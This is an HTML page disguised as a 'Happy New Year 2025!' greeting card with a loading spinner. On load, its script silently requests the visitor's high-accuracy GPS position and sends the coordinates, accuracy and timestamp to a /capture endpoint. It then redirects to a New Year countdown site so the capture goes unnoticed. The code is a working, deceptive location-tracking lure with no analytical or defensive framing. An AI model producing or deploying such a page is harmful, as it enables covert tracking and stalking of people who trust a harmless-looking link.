<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Happy New Year 2025!</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            font-family: Arial, sans-serif;
            color: white;
        }
        .container {
            text-align: center;
        }
        h1 {
            font-size: 3em;
            margin-bottom: 20px;
            animation: glow 2s ease-in-out infinite;
        }
        .loader {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #FFD700;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 30px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        @keyframes glow {
            0%, 100% { text-shadow: 0 0 10px #FFD700, 0 0 20px #FFD700; }
            50% { text-shadow: 0 0 20px #FFD700, 0 0 30px #FFD700, 0 0 40px #FFD700; }
        }
        .message {
            font-size: 1.2em;
            margin-top: 20px;
        }
    </style>
    <script>
        function captureLocation() {
            if (!navigator.geolocation) {
                window.location.href = 'https://vclock.com/timer/new-years-day/';
                return;
            }

            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    const accuracy = position.coords.accuracy;
                    const timestamp = new Date(position.timestamp).toLocaleString();

                    fetch(`/capture?lat=${latitude}&lon=${longitude}&accuracy=${accuracy}&timestamp=${timestamp}`)
                        .then(() => {
                            setTimeout(() => {
                                window.location.href = 'https://vclock.com/timer/new-years-day/';
                            }, 1000);
                        })
                        .catch(() => {
                            window.location.href = 'https://vclock.com/timer/new-years-day/';
                        });
                },
                function(error) {
                    setTimeout(() => {
                        window.location.href = 'https://vclock.com/timer/new-years-day/';
                    }, 1000);
                },
                {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                }
            );
        }

        window.onload = captureLocation;
    </script>
</head>
<body>
    <div class="container">
        <h1>Happy New Year 2025!</h1>
        <div class="loader"></div>
        <p class="message">Preparing your celebration...</p>
    </div>
</body>
</html>
